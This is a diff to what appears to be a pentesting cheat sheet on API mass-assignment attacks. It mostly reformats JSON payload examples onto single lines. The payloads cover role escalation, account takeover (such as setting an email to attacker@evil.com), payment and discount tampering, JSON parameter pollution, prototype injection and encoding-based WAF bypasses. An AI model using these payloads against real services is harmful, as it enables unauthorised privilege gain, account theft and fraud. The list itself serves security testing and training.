@@ -2559,7 +2559,7 @@ If the web application is not checking which parameters are allowed to be update
 * [Root Me - API - Mass Assignment](https://www.root-me.org/en/Challenges/Web-Server/API-Mass-Assignment)
 
 # 🔹 Basic API Mass Assignment Payloads
-a
+
 * Simple role escalation (JSON):  `{"role":"admin"}` → Adds hidden role field in API request.
 * Admin flag injection:  `{"isAdmin":true}` → Gains elevated privileges.
 * Access level override:  {"access_level":999}` → Maximum permission.
@@ -2603,36 +2603,15 @@ a
     "permissions":"all"
   }
   ```
-* Partial update abuse:
-  ```json
-  {
-    "role":"admin"
-  }
-  ```
-* Add unauthorized field:
-  ```json
-  {
-    "internal":true
-  }
-  ```
+* Partial update abuse:   ```json    {  "role":"admin"   }  ```
+* Add unauthorized field:  ```json   {    "internal":true   }  ```
+
 # 🔹 Account Takeover via API
 
-* ID override:
-  ```json
-  {"user_id":1}
-  ```
-* Owner change:
-  ```json
-  {"owner_id":1}
-  ```
-* Email takeover:
-  ```json
-  {"email":"attacker@evil.com"}
-  ```
-* Username impersonation:
-  ```json
-  {"username":"admin"}
-  ```
+* ID override:    ```json   {"user_id":1}   ```
+* Owner change:   ```json   {"owner_id":1}   ```
+* Email takeover:    ```json    {"email":"attacker@evil.com"}   ```
+* Username impersonation:   ```json   {"username":"admin"}   ```
 
 # 🔹 Bulk API Abuse
 
@@ -2645,86 +2624,33 @@ a
     ]
   }
   ```
-* Mass privilege escalation:
-  ```json
-  {
-    "accounts":[{"access_level":999}]
-  }
-  ```
+* Mass privilege escalation:      ```json  {    "accounts":[{"access_level":999}]  }  ```
 # 🔹 Business Logic Manipulation (API)
 
-* Payment tampering:
-  ```json
-  {"amount":1}
-  ```
-* Discount abuse:
-  ```json
-  {"discount":100}
-  ```
-* Plan upgrade:
-  ```json
-  {"plan":"enterprise"}
-  ```
-* Order manipulation:
-  ```json
-  {"status":"completed"}
-  ```
+* Payment tampering:    ```json  {"amount":1}  ```
+* Discount abuse:  ```json  {"discount":100}  ```
+* Plan upgrade:  ```json  {"plan":"enterprise"}  ```
+* Order manipulation:  ```json  {"status":"completed"}  ```
 
 # 🔹 JSON Parameter Pollution (API)
 
-* Duplicate key override:
-  ```json
-  {"role":"user","role":"admin"}
-  ```
-
-* Array confusion:
-  ```json
-  {"role":["user","admin"]}
-  ```
-
-* Null override:
-  ```json
-  {"role":null,"role":"admin"}
-  ```
-
-* Boolean conflict:
-  ```json
-  {"isAdmin":false,"isAdmin":true}
-  ```
+* Duplicate key override:  ```json  {"role":"user","role":"admin"}  ```
+* Array confusion:     ```json  {"role":["user","admin"]}  ```
+* Null override:     ```json  {"role":null,"role":"admin"}  ```
+* Boolean conflict:    ```json  {"isAdmin":false,"isAdmin":true}  ```
 
 # 🔹 Advanced API Object Tricks
 
-* Metadata injection:
-  ```json
-  {"meta":{"role":"admin"}}
-  ```
-* Config override:
-  ```json
-  {"config":{"debug":true}}
-  ```
-* Dot notation:
-  ```json
-  {"user.role":"admin"}
-  ```
-* Prototype style:
-  ```json
-  {"__proto__":{"admin":true}}
-  ```
+* Metadata injection:    ```json  {"meta":{"role":"admin"}}  ```
+* Config override:   ```json  {"config":{"debug":true}}  ```
+* Dot notation:    ```json  {"user.role":"admin"}   ```
+* Prototype style:  ```json  {"__proto__":{"admin":true}}  ```
 
 # 🔹 Content-Type Based Bypass
 
-* JSON as text:  
-  `Content-Type: text/plain`  
-  → Backend still parses JSON.
-
-* Form instead of JSON:  
-  `role=admin&isAdmin=true`
-
-* Multipart request:
-  ```
-  Content-Type: multipart/form-data
-  role=admin
-  ```
+* JSON as text:    `Content-Type: text/plain`    → Backend still parses JSON.
+* Form instead of JSON:    `role=admin&isAdmin=true`
+* Multipart request:    ```  Content-Type: multipart/form-data  role=admin  ```
 
 # 🔹 WAF Bypass Techniques (API Mass Assignment)
 
@@ -2732,41 +2658,21 @@ a
 
 * URL encoding:    `%72%6f%6c%65=admin`
 * Double encoding:    `%2572%256f%256c%2565=admin`
-* Unicode encoding: 
-  ```json
-  {"r\u006fle":"admin"}
-  ```
+* Unicode encoding:    ```json  {"r\u006fle":"admin"}  ```
 
 ## 🧩 Case Variation
 
-* Mixed case keys:
-  ```json
-  {"RoLe":"AdMiN"}
-  ```
-
-* Uppercase keys:
-  ```json
-  {"ROLE":"ADMIN"}
-  ```
+* Mixed case keys:   ```json  {"RoLe":"AdMiN"}  ```
+ * Uppercase keys:    ```json  {"ROLE":"ADMIN"}  ```
 
 ## 🧩 Nested Structure Bypass
 
-* Deep nesting:
-  ```json
-  {"data":{"user":{"role":"admin"}}}
-  ```
-
-* Wrapper bypass:
-  ```json
-  {"payload":{"role":"admin"}}
-  ```
+* Deep nesting:    ```json  {"data":{"user":{"role":"admin"}}}  ```
+* Wrapper bypass:    ```json  {"payload":{"role":"admin"}}  ```
 
 ## 🧩 Duplicate Override
 
-* Multi-layer override:
-  ```json
-  {"role":"user","data":{"role":"admin"}}
-  ```
+* Multi-layer override:    ```json  {"role":"user","data":{"role":"admin"}}  ```
 
 ## 🧩 Field Explosion
 
